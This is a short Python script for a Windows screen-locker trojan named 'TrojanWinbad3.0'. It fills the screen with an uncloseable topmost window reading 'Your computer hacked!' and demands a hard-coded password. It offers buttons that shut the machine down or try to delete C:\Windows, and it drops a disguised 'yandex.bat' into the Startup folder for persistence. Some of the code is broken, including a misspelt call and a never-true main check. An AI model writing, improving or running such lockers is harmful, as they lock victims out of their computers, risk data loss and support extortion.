import random
import os
import sys
from tkinter import *
from tkinter import messagebox
from getpass import getuser
from os.path import realpath, dirname

user = getuser()

win = Tk()

def NOEXIT():
  pass

def pw(arg):
  if PE.get() == password:
    exit()
  else:
    messagebox.showarning("Error", "Wrong Password")

def Shutdown():
  os.system("shutdown /s /t 1")

def DELWIN():
  os.remove("C:\Windows")

def start():
  path = dirname(realpath(__file__))
  bat_path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  with open(f'{bat_path}/yandex.bat', 'w+') as bat_file:
    bat_file.write(fr'start {path}/{sys.argv[0]}')
    
###################################
X = win.winfo_screenwidth()
Y = win.winfo_screenheight()
bg = "black"
fg = "red"
title = "TrojanWinbad3.0"
font1 = "Arial 100 bold"
font2 = "Arial 50 bold"
font3 = "Arial 35 bold"
password = "131433"
win["bg"] = bg
win.title(title)
win.protocol("WM_DELETE_WINDOW", NOEXIT)
win.attributes("-topmost", 1)
win.overrideredirect(1)
win.geometry(f"{X}x{Y}")
Label(text="Your computer hacked!", bg=bg, fg=fg, font=font1).pack()
Label(text="Winbad 3.0 by sek13", bg=bg, fg=fg, font=font2).pack()
Label(text="Write password for unlock windows!", bg=bg, fg=fg, font=font3).pack()
PE = Entry(font=font2)
PE.pack()
PE.bind("<Return>", pw)
Button(text="Shutdown", bg=bg, fg=fg, font=font2, command=lambda:Shutdown()).pack()
Button(text="Delete windows", bg=bg, fg=fg, font=font2, command=lambda:DELWIN()).pack()
if __file__ == "__main__":
  start()
win.mainloop()
